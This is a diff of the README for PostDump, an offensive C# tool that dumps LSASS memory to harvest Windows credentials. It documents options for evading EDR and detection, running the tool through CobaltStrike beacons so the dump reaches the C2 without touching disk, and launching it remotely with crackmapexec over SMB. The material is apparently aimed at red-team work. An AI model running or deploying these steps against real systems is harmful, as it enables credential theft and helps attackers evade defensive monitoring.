@@ -4,48 +4,74 @@
 
 PostDump is a C# tool developt by COS team (Cyber Offensive and Security) of POST Luxembourg.
 
-It is yet another simple tool to perform a memory dump (lsass) using several technics to bypass EDR hooking and lsass protection.
+It is yet another simple tool to perform a LSASS memory dump using few technics to avoid detection.
 
-Unlike tools like EDRSandBlast, it focused on unhooking only functions stricly required in order to dump the memory, thus done by using DInvoke to map required unhooked DLL. With an exception for NtReadVirtualMemory which is dynamicly patched if hook is detected.
+![screenshot](resources/demo.png)
 
-Project in constant improvement (hook detection, direct syscalls).
+New PostDump version include C# / .NET implementation of the famous NanoDump's `NanoDumpWriteDump` function, which permit to dump most important LSASS modules only, without calling `MiniDumpWriteDump` Windows API function.
+The dump logic code is saved under the `POSTMinidump` project, feel free to use it for your own C# / .NET project.
 
-## Technics used
-
-- DInvoke -> Credit to TheWover for its C# implementation [C# DInvoke](https://github.com/TheWover/DInvoke)
-- PssCaptureSnapshot Duplicate Handle -> Credit to Inf0SecRabbit for its C# implementation [MiniDumpSnapshot](https://github.com/Inf0secRabbit/MiniDumpSnapshot)
-- NtReadVirtualMemory hook patching (Patch instead of DInvoke call due to MiniDumpWriteDump "underthehood" call to NtReadVirtualMemory)
-- MiniDumpWriteDump to dump memory
-
-
-## Behavior
-
-- Check if NtReadVirtualMemory is hooked, if yes -> patching
-- Map NTDLL.dll from disk using DInvoke to call unhooked NtOpenProcess functions and get handle on LSASS process using only PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION privileges (minimum required for PssCaptureSnapshot)
-- Map Kernel32.dll from disk using DInvoke to call unhooked PssCaptureSnapshot function and duplicate LSASS
-- Map dbgcore.dll from disk using DInvoke to call unhooked MiniDumpWriteDump function and dump duplicated handle
+Such as NanoDump, you can encrypt or use an invalid signature for the minidump, but also use BOFNET to avoid touching disk and download file to CobaltStrike C2 directly.
 
 
 ## Usage
 
 Dump LSASS:
 
-    C:\Temp>PostDump.exe
+    c:\Temp>PostDump.exe --help
 
-    [*] NtReadVirtualMemory: HOOKED! Patching...
-    [*] NtReadVirtualMemory --> NOT Hooked!
-    
-    [*] NtOpenProcess: NOT Hooked!
-    [*] Real Process Handle: 728
-    
-    [*] PssCaptureSnapshot: NOT Hooked!
-    [*] Snapshot succeed! Duplicate handle: 1549097566208
-    
-    [*] MiniDumpWriteDump: NOT Hooked!
-    [*] Duplicate dump successful. Dumped 49737034 bytes to: c:\Temp\yolo.log
+    -o, --output        output filename [default: Machine_datetime.dmp]
+
+    -e, --encrypt       Encrypt dump in-memory
+
+    -s, --signature     Generate fake Minidump signature
+
+    --snap              Use snapshot technic
+
+    --fork              Use fork technic [default]
+
+    --elevate-handle    Open a handle to LSASS with low privileges and duplicate it to gain higher privileges
+
+    --help              Display this help screen.
+  
+    --version           Display version information.
 
 
-## Compile Instructions
 
-PostDump has been built using .NET Framework 4.8 and is compatible with [Visual Studio 2022 Community Edition](https://visualstudio.microsoft.com/fr/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&cid=2030&passive=false). 
-Simply open up the project .sln, choose "release x64", and build.
+## BOFNET
+
+To use PostDump with Cobaltstrike, you must download and compile [BOFNET](https://github.com/CCob/BOF.NET):
+- Build PostDump and place CommandLine.dll file into same folder as BOFNET.cna
+- import the .cna file into your cobalt
+- `beacon> bofnet_init`
+- `beacon> bofnet_load PostDump.exe`
+- `beacon> bofnet_execute POSTDump.BOFNET [args]`
+- If you plan to NOT use BOFNET (eg: binary uploaded on a system), it is preferable to remove it from the project before compiling, otherwise you'll need the BOFNET.dll file on the system too.
+
+
+## CME and LSASSY modules
+- Both use embedded base64 binary and autoclean
+- Will not work with --encrypt or --signature
+- copy CME-module/postdump.py into your CME modules folder
+- copy LSASSY-module/postdump.py into your LSASSY modules folder
+- `crackmapexec smb x.x.x.x -u user -p 'password' -M postdump [--options]`
+- `crackmapexec smb x.x.x.x -u user -p 'password' -M lsassy -o METHOD=postdump`
+
+
+## Improvements idea
+- Use Syscalls instead of Dinvoke
+- AMSI/ETW patching
+- Implement more dump technics (duplicate handle, seclogon ..)
+
+
+## Compilation
+- You can build using .NET Framework 4.5.1 as-is.
+- Depending of the CLR version installed on the system where you execute PostDump, you may need to downgrade to .NET 3.5 [more info here](https://learn.microsoft.com/fr-fr/dotnet/framework/migration-guide/versions-and-dependencies)
+- If you downgrade to .NET Framework 3.5, you'll need to downgrade CommandLineParser dependance too
+- If you plan to NOT use BOFNET, it is preferable to remove it from the project before compiling, otherwise you'll need the BOFNET.dll file on the system to execute the tool.
+
+
+## Credit
+- TheWover for the C# implementation of [DInvoke](https://github.com/TheWover/DInvoke)
+- [_EthicalChaos_](https://twitter.com/_EthicalChaos_) for the project [BOFNET](https://github.com/CCob/BOF.NET)
+- [s4ntiago_p](https://twitter.com/s4ntiago_p) for the awesome NanoDump tool and its implementation of the lsass dump logic (among all other cool stuff)
